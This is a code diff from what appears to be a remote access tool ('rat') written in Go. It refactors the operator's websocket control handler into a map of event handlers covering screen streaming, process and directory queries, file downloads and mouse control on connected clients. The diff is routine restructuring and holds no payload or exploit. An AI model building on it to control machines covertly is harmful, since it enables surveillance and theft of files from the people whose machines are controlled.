@@ -2,10 +2,7 @@ package main
 
 import (
 	"fmt"
-	"io/ioutil"
 	"net/http"
-	"rat/common"
-	"time"
 
 	"encoding/json"
 
@@ -23,49 +20,41 @@ const (
 	MouseMove                   = 10
 )
 
-type DisplayTransfer struct {
-	Remote   string  `json:"remote"`
-	Local    string  `json:"local"`
-	Progress float64 `json:"progress"`
-	ID       float64 `json:"id"`
-	Status   int     `json:"status"`
-	Download bool    `json:"download"`
-	Key      string  `json:"key,omitempty"`
-}
-
-var DisplayTransfers []DisplayTransfer
-
+// Event incoming message data
 type Event struct {
-	Event    int    `json:"event"`
-	ClientId int    `json:"id"`
-	Data     string `json:"data"`
+	// Event code
+	Event int `json:"event"`
+
+	// ClientID
+	ClientID int `json:"id"`
+
+	// Data is the event data (might be JSON)
+	Data string `json:"data"`
 }
 
-type ScreenEvent struct {
-	Activate bool    `json:"active"`
-	Scale    float32 `json:"scale"`
-	Monitor  int     `json:"monitor"`
+// EventHandler handles incoming websocket message
+type EventHandler interface {
+	Handle(ws *websocket.Conn, client *Client, data string) error
 }
 
-type DirectoryRequestEvent struct {
-	Path string `json:"path"`
+// Message empty message struct
+type Message struct {
 }
 
-type DownloadEvent struct {
-	File string `json:"file"`
-}
+// MessageMap is a map with event handlers and their codes
+type MessageMap map[int]EventHandler
 
-type MouseMoveEvent struct {
-	X       float32 `json:"x"`
-	Y       float32 `json:"y"`
-	Monitor int     `json:"id"`
-}
+// Messages contains all incoming messages mapped with their codes
+var Messages MessageMap
 
-type DownloadProgressEvent struct {
-	File  string `json:"file"`
-	Read  int64  `json:"read"`
-	Total int64  `json:"total"`
-	Key   string `json:"key,omitempty"`
+func init() {
+	Messages = make(MessageMap)
+	Messages[TransfersEvent] = DisplayTransferEvent{}
+	Messages[MouseMove] = MouseMoveMessage{}
+	Messages[DownloadQueryEvent] = DownloadMessage{}
+	Messages[DirectoryQueryEvent] = DirectoryRequestMessage{}
+	Messages[ProcessQueryEvent] = ProcessQueryMessage{}
+	Messages[ScreenUpdateEvent] = ScreenUpdateMessage{}
 }
 
 func newEvent(event int, clientID int, data string) *Event {
@@ -95,122 +84,24 @@ func incomingWebSocket(ws *websocket.Conn) {
 			return
 		}
 
-		if event.ClientId == 0 {
+		if event.ClientID == 0 {
 			continue
 		}
 
-		client := get(event.ClientId)
+		client := get(event.ClientID)
 
-		if event.Event == ScreenUpdateEvent {
-			var screenEvent ScreenEvent
-			err := json.Unmarshal([]byte(event.Data), &screenEvent)
-
+		if handler, ok := Messages[event.Event]; ok {
+			err = handler.Handle(ws, client, event.Data)
 			if err != nil {
-				fmt.Println("json:", err.Error(), event.Data)
+				fmt.Println("websocket message:", err.Error())
 			}
-
-			stream := screenEvent.Activate
-
-			if stream {
-				json, err := json.Marshal(&client.Monitors)
-
-				if err != nil {
-					fmt.Println("json:", err)
-				}
-
-				event := newEvent(MonitorQueryEvent, client.Id, string(json))
-
-				err = websocket.JSON.Send(ws, &event)
-
-				if err != nil {
-					fmt.Println("ws:", err)
-				}
-			}
-
-			scale := screenEvent.Scale
-			monitor := screenEvent.Monitor
-
-			client.Listeners[common.MonitorsHeader] = ws
-
-			packet := ScreenPacket{stream, scale, monitor}
-			client.Queue <- packet
-
-			if !client.Screen.Streaming {
-				go ScreenStream(client, ws)
-			}
-
-			client.Screen.Streaming = stream
-			defer func() {
-				client.Screen.Streaming = false
-			}()
-		} else if event.Event == ProcessQueryEvent {
-			client.Listeners[common.ProcessHeader] = ws
-			client.Queue <- ProcessPacket{}
-		} else if event.Event == DirectoryQueryEvent {
-			var directoryEvent DirectoryRequestEvent
-			err := json.Unmarshal([]byte(event.Data), &directoryEvent)
-			if err != nil {
-				fmt.Println(err.Error())
-				break
-			}
-
-			client.Listeners[common.DirectoryHeader] = ws
-			client.Queue <- DirectoryPacket{directoryEvent.Path}
-		} else if event.Event == DownloadQueryEvent {
-			var downloadEvent DownloadEvent
-			err := json.Unmarshal([]byte(event.Data), &downloadEvent)
-
-			if err != nil {
-				fmt.Println(err.Error())
-				break
-			}
-
-			file, _ := ioutil.TempFile("", "download")
-
-			client.Listeners[common.GetFileHeader] = ws
-			Transfers[downloadEvent.File] = &Transfer{file, downloadEvent.File, 0, 0}
-			client.Queue <- DownloadPacket{downloadEvent.File}
-		} else if event.Event == MouseMove {
-			var mouseEvent MouseMoveEvent
-			err := json.Unmarshal([]byte(event.Data), &mouseEvent)
-			if err != nil {
-				fmt.Println(err.Error())
-				break
-			}
-
-			client.Queue <- MouseMovePacket{mouseEvent.Monitor, int(mouseEvent.X), int(mouseEvent.Y)}
-		} else if event.Event == TransfersEvent {
-			err := json.Unmarshal([]byte(event.Data), &DisplayTransfers)
-
-			if err != nil {
-				fmt.Println(err.Error())
-			}
+		} else {
+			fmt.Println("Unknown message:", event.Event)
 		}
 	}
 }
 
+/// InitControlSocket starts listening for incoming websocket connections
 func InitControlSocket() {
 	http.Handle("/control", websocket.Handler(incomingWebSocket))
-}
-
-// ScreenStream streams screen to websocket
-func ScreenStream(client *Client, ws *websocket.Conn) {
-	for client.Screen.Streaming {
-		if !client.Screen.New {
-			time.Sleep(time.Millisecond)
-			continue
-		}
-
-		client.Screen.New = false
-
-		event := newEvent(ScreenUpdateEvent, client.Id, client.GetEncodedScreen())
-
-		err := websocket.JSON.Send(ws, &event)
-
-		if err != nil {
-			fmt.Println("screenstream:", err.Error())
-			return
-		}
-
-	}
 }
